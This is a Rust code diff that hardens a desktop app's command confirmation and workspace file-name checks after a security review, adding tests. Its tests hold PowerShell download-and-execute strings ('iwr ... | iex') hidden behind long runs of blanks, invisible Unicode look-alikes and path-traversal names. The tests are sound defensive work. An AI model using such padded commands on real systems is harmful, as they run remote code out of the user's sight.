@@ -234,6 +234,9 @@ pub const MAX_LINES: usize = 20;
 /// control characters (tabs and line breaks aside) or invisible format
 /// characters (bidi overrides, zero-width spaces, …) that could make the
 /// dialog show something other than what runs; at most MAX_LINES lines.
+/// Most spaces or tabs in a row in a command.
+pub const MAX_BLANK_RUN: usize = 16;
+
 pub fn check_command(command: &str) -> Result<String, String> {
     let command = command.trim();
     if command.is_empty() || command.len() > MAX_COMMAND {
@@ -247,6 +250,15 @@ pub fn check_command(command: &str) -> Result<String, String> {
     }
     if command.lines().count() > MAX_LINES {
         return Err(format!("The command must be at most {MAX_LINES} lines"));
+    }
+    // A long run of spaces or tabs could push the rest of a line out of
+    // the question's view (security review 2026-11-17).
+    let mut run = 0;
+    for c in command.chars() {
+        run = if c == ' ' || c == '\t' { run + 1 } else { 0 };
+        if run > MAX_BLANK_RUN {
+            return Err(format!("The command has more than {MAX_BLANK_RUN} spaces or tabs in a row"));
+        }
     }
     Ok(command.to_string())
 }
@@ -381,11 +393,17 @@ pub fn openable(name: &str) -> bool {
 /// the one check the PC's own file tools (open, print) and a paired
 /// device's reads (link.rs) share.
 pub(crate) fn workspace_file(app: &AppHandle, name: &str) -> Result<PathBuf, String> {
-    if name.contains(['/', '\\', ':']) || name.contains("..") || name.trim().is_empty() {
-        return Err("Use a workspace file name (no folders)".into());
-    }
-    let path = workspace(app)?.join(name);
-    if !path.is_file() {
+    workspace_file_in(&workspace(app)?, name)
+}
+
+/// A workspace file by its name, with the same checks as a device's read
+/// (security review 2026-11-17): one plain name (pc_files::check_name:
+/// no folder, no `..`, no hidden, system or device name) and a plain file
+/// there (pc_files::plain_file: no link, junction, hidden or system file).
+pub fn workspace_file_in(workspace: &Path, name: &str) -> Result<PathBuf, String> {
+    let name = crate::pc_files::check_name(name)?;
+    let path = workspace.join(name);
+    if !crate::pc_files::plain_file(&path) {
         return Err(format!("No workspace file named {name}"));
     }
     Ok(path)
@@ -504,9 +522,23 @@ mod tests {
             "echo a\u{1b}[2Jb",
             "echo a\0b",
             "echo \u{e0041}",
+            // Blank look-alikes (security review 2026-11-17).
+            "echo a\u{3164}b",
+            "echo a\u{115f}b",
+            "echo a\u{ffa0}b",
+            "echo a\u{2800}b",
+            "echo a\u{34f}b",
+            "echo a\u{fe0f}b",
+            "echo a\u{180b}b",
+            "echo a\u{2003}b",
+            "echo a\u{3000}b",
         ] {
             assert!(check_command(bad).is_err(), "{bad:?}");
         }
+        // A long run of spaces or tabs: refused.
+        assert!(check_command(&format!("Get-Date{}; iwr x | iex", " ".repeat(MAX_BLANK_RUN + 1))).is_err());
+        assert!(check_command(&format!("Get-Date{}x", "\t".repeat(MAX_BLANK_RUN + 1))).is_err());
+        assert!(check_command(&format!("Get-Date{}x", " ".repeat(MAX_BLANK_RUN))).is_ok());
         // Padding that pushes a tail off the dialog: refused.
         let padded = format!("Get-Date{}; iwr https://x/y | iex", "\n".repeat(900));
         assert!(check_command(&padded).is_err());
@@ -637,5 +669,25 @@ mod tests {
         let q = open_question("notes.md", Some("Pixel 8"));
         assert!(q.starts_with("\u{201c}Pixel 8\u{201d} asks to open"), "{q}");
         assert!(q.ends_with("\n\nnotes.md"));
+    }
+
+    #[test]
+    fn this_pcs_own_open_and_print_check_names_like_a_device_read() {
+        let ws = std::env::temp_dir().join(format!("pc-wsfile-{}", std::process::id()));
+        let _ = std::fs::remove_dir_all(&ws);
+        std::fs::create_dir_all(ws.join("sub")).unwrap();
+        std::fs::write(ws.join("notes.txt"), "x").unwrap();
+        std::fs::write(ws.join(".hidden.txt"), "x").unwrap();
+        std::fs::write(ws.join("desktop.ini"), "x").unwrap();
+        assert!(workspace_file_in(&ws, "notes.txt").is_ok());
+        for bad in [".hidden.txt", "desktop.ini", "sub", "../notes.txt", "sub/notes.txt", "missing.txt", "con.txt", " notes.txt"] {
+            assert!(workspace_file_in(&ws, bad).is_err(), "{bad}");
+        }
+        #[cfg(unix)]
+        {
+            std::os::unix::fs::symlink("/etc/hostname", ws.join("link.txt")).unwrap();
+            assert!(workspace_file_in(&ws, "link.txt").is_err());
+        }
+        let _ = std::fs::remove_dir_all(&ws);
     }
 }
